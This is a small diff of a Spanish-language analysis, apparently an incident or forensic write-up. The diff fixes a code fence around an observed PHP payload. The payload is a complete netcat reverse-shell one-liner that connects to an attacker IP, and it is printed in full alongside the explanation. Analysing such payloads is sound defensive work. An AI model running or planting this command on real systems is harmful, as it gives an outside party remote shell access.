@@ -230,7 +230,7 @@ En el contenido del archivo subido se observa el siguiente payload PHP:
 
 ```php
 <?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 117.11.88.124 8080 >/tmp/f"); ?>
-
+```
 Este código ejecuta un reverse shell utilizando nc (netcat), conectándose a:
 
 IP del atacante: 117.11.88.124
